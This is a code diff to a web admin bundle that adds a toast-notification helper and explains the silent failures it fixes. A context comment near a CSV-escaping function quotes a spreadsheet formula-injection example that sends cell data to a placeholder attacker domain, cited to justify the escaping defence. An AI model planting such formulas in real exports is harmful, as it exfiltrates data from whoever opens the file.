@@ -197,6 +197,37 @@ document.addEventListener('DOMContentLoaded', async () => {
 //      `=HYPERLINK("https://evil.tld?"&A1)` would fire when an admin opens an
 //      export. Prefixing an apostrophe forces the cell to be read as text; the
 //      apostrophe is not displayed by the spreadsheet.
+// ============================================================
+// showToast — the admin bundle's notification
+// ============================================================
+// ⚠️ THIS DID NOT EXIST until 2026-08-12, and three callers assumed it did.
+// js/app.js defines a showToast, but that file is the PARENT registration
+// bundle — it is not part of dist/admin.min.js. So:
+//   * admin-calendar.js guarded with `typeof showToast === 'function'`, which
+//     meant its "the invoice could not be recalculated" warning NEVER showed —
+//     a silent failure in billing, the one place silence is least affordable
+//   * admin-incidents.js and admin-threads.js called it unguarded, so a
+//     SUCCESSFUL incident approval or message reply threw ReferenceError into
+//     the catch block and reported itself as an error
+//
+// Defining it once here fixes all three, and the guard in admin-calendar now
+// passes instead of quietly skipping.
+function showToast(msg, kind = 'ok') {
+    let el = document.getElementById('adminToast');
+    if (!el) {
+        el = document.createElement('div');
+        el.id = 'adminToast';
+        document.body.appendChild(el);
+    }
+    el.textContent = msg;
+    el.className = 'admin-toast' + (kind === 'error' ? ' admin-toast-err' : '');
+    el.classList.add('show');
+    clearTimeout(showToast._t);
+    // Errors linger: a director who looked away should still find out that the
+    // thing she clicked did not work.
+    showToast._t = setTimeout(() => el.classList.remove('show'), kind === 'error' ? 6000 : 3000);
+}
+
 function csvCell(val) {
     let str = String(val ?? '');
     if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
